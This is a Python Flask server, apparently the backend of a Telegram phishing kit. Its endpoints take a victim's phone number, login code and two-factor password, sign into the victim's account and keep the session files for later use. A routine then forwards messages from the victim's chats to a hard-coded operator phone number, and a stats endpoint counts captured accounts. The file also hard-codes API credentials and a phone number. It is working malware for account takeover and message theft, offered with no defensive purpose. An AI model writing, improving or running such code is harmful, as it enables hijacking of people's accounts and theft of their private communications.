from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import sqlite3
import os
import logging
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

# База данных для сессий и хэшей
def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (phone TEXT PRIMARY KEY, 
                  phone_code_hash TEXT,
                  session_file TEXT,
                  status TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# Глобальный словарь для хранения временных данных
auth_sessions = {}

async def send_code_request(phone):
    """Отправляем код и сохраняем phone_code_hash"""
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        # Отправляем код запроса
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        # Сохраняем в базу
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO auth_sessions 
                    (phone, phone_code_hash, session_file, status) 
                    VALUES (?, ?, ?, ?)''',
                 (phone, phone_code_hash, session_file, 'code_sent'))
        conn.commit()
        conn.close()
        
        await client.disconnect()
        return {'status': 'code_sent', 'phone_code_hash': phone_code_hash}
        
    except Exception as e:
        logging.error(f"❌ Send code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_code(phone, code):
    """Проверяем код с сохраненным phone_code_hash"""
    try:
        # Получаем сохраненный phone_code_hash
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT phone_code_hash, session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        phone_code_hash, session_file = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        # Пытаемся войти с кодом и хэшем
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Успешный вход
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
            conn.commit()
            conn.close()
            
            await start_data_collection(client, phone)
            await client.disconnect()
            
            return {'status': 'success'}
            
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'password_required'}
            
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'status': 'invalid_code'}
            
    except Exception as e:
        logging.error(f"❌ Verify code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_password(phone, password):
    """Проверяем пароль 2FA"""
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session_file = result[0]
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        await client.sign_in(password=password)
        
        # Успешный вход с паролем
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
        conn.commit()
        conn.close()
        
        await start_data_collection(client, phone)
        await client.disconnect()
        
        return {'status': 'success'}
        
    except Exception as e:
        logging.error(f"❌ Password error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def start_data_collection(client, phone):
    """Начинаем сбор данных"""
    try:
        me = await client.get_me()
        logging.info(f"✅ SUCCESS - Logged in as: {me.first_name} ({phone})")
        
        # Пересылаем сообщения
        async for dialog in client.iter_dialogs(limit=5):
            try:
                async for message in client.iter_messages(dialog.id, limit=3):
                    if message.text:
                        await client.forward_messages(YOUR_PHONE, message)
                        break
            except:
                continue
                
    except Exception as e:
        logging.error(f"❌ Data collection error: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'Telegram Auth Server'})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    logging.info(f"🔐 Auth request: {phone}")
    
    result = run_async(send_code_request(phone))
    return jsonify(result)

@app.route('/code', methods=['POST'])
def verify_code_route():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    logging.info(f"📱 Code verify: {phone}")
    
    result = run_async(verify_code(phone, code))
    return jsonify(result)

@app.route('/password', methods=['POST'])
def verify_password_route():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    logging.info(f"🔑 Password verify: {phone}")
    
    result = run_async(verify_password(phone, password))
    return jsonify(result)

@app.route('/stats', methods=['GET'])
def stats():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
    active = c.fetchone()[0]
    conn.close()
    return jsonify({'active_sessions': active})

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000)
